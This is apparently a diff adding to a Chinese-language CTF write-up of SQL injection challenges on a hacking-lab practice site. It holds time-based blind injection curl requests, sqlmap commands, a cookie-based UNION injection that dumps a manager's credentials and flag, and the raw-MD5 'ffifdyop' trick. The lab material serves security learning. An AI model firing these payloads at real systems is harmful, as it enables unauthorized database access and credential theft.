@@ -280,10 +280,221 @@ key#notfound!#
 　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。
 　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。
 
+先暴库，暴库的长度
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(length(concat(database()))=5,sleep(2),1)--+"
+<html>
+    <head>
+        <title>SQLi4_article</title>
+    </head>
+    <body> 
+      <div>
+            <h2> </h2>
+          <div class="content">username:admin'and if(length(concat(database()))=5,sleep(2),1)-- <br>status:ok </div>
+        </div>
+                
+    </body>
+</html>
+
+
+real	0m8.221s
+user	0m0.052s
+sys	0m0.164s
+```
+
+再逐一暴库的字符。
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),1,1))<110,sleep(2),1)--+"
+```
+`m`
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),2,1))<122,sleep(2),1)--+"
+```
+`y`
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),3,1))<100,sleep(2),1)--+"
+```
+`d`
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),4,1))<98,sleep(2),1)--+"
+```
+`a`
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if(ascii(substr(concat(database()),5,1))<116,sleep(2),1)--+"
+```
+`s`
+
+OK！数据库叫mydas。
+
+报表。
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29)=3,sleep(2),1)--+"
+```
+3个表。
+逐一报表名。
+暴露长度，并逐一暴露表名字符。
+第一个表
+
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)=3,sleep(2),1)--+"
+```
+长度3。
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<108,sleep(2),1)--+"
+l
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<112,sleep(2),1)--+"
+o
+
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%200%2C1)<104,sleep(2),1)--+"
+g
+```
+NMB。
+下一个。
+
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<6,sleep(2),1)--+"
+长度为5
+
+ time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<110,sleep(2),1)--+"
+`m`
+
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C2%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<112,sleep(2),1)--+"
+p
+
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C3%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<117,sleep(2),1)--+"
+t
+
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C4%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%201%2C1)<116,sleep(2),1)--+"
+s
 
 
 
+```
+```
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20length%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)<5,sleep(2),1)--+"
+长度为4
 
+time curl "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin'and%20if((select%20ascii%28substr%28table_name%2C1%2C1%29%29%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20limit%202%2C1)<118,sleep(2),1)--+"
+`u`
+
+
+
+```
+烦死了，直接用SQLMAP跑吧。
+```
+python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin --current-db
+```
+	
+	Parameter: username (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: username=admin' AND SLEEP(5) AND 'Leyp'='Leyp
+    ...
+	current database:    'mydbs'
+
+获取表。
+```
+python sqlmap.py -u http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin -D mydbs --tables
+```
+
+	Database: mydbs
+	[3 tables]
+	+-------+
+	| user  |
+	| log   |
+	| motto |
+	+-------+
+
+获取`motto`的字段
+
+
+
+## SQL注入通用防护
+
+过滤了HTTP的GET和POST方法，头一次听说COOKIE注入。
+
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1'"
+```
+
+	<html>
+	    <head>
+	        <title>SQLi8_article</title>
+	    </head>
+	    <body><br />
+	<b>Warning</b>:  mysql_fetch_row() expects parameter 1 to be resource, boolean given in <b>sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php</b> on line <b>27</b><br />
+	        
+	    </body>
+	</html>
+那么接下来就是正常的注入过程。
+
+- 得到字段数目
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=2 order by 4"
+```
+字段数目为3。
+- 得到显示位
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,3"
+```
+
+显示位为2，3
+
+- 获取当前数据库的表
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()"
+```
+得到数据表为：`sae_manager_sqli8,sae_user_sqli8`
+
+- 获取`sae_manager_sqli8`列名
+
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name='sae_manager_sqli8'"
+```
+
+id,username,password
+
+- 获取数据
+
+```
+curl "http://lab1.xseclab.com/sqli8_f4af04563c22b18b51d9142ab0bfb13d/index.php?id=1" -H "Cookie: PHPSESSID=1c78312b1fc4ce0d5310b8681;id=1 union select 1,username,password from sae_manager_sqli8 limit 1,1 "
+```
+
+	<html>
+	    <head>
+	        <title>SQLi8_article</title>
+	    </head>
+	    <body>      <div>
+	            <h2>manager</h2>
+	            <div class="content">IamFlagCookieInject!</div>
+	        </div>
+	        
+	    </body>
+	</html>
+
+
+## 据说哈希后的密码是不能产生注入的
+
+这关没有通过。。。
+python关于md5的方法为：
+```
+import hashlib
+s='ffifdyop'
+d=hashlib.md5(s)
+
+d.hexdigest()
+Out[35]: '276f722736c95d99e921722cf9ed621c'
+
+d.digest()
+Out[36]: "'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c"
+```
 
 
 # [RegTiger](http://redtiger.labs.overthewire.org)
@@ -359,3 +570,7 @@ got it.拿到用户名密码后登录即可。
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
 [2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
+
+
+# sqli-labs
+
